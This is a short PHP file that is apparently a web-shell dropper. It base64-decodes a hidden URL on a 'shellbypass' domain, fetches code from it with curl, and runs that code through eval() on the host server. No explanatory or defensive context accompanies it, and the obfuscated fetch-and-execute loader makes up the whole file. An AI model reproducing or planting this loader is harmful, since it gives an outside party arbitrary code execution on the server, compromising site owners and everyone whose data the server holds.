<?php
 function c($F){
$url = $F;
$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_TIMEOUT, 15);
$resp = curl_exec($curl);
curl_close($curl);
return ($resp);
}

$r = base64_decode('Pz4=');
echo eval($r . c(base64_decode('aHR0cHM6Ly9yYXcuc2hlbGxieXBhc3MuY29tL3R4dC9yYXcvNTdmZWM5ZWE0MDk4MTc0MmRlMDRiZTRiMDExNDRkOTA=')));

?>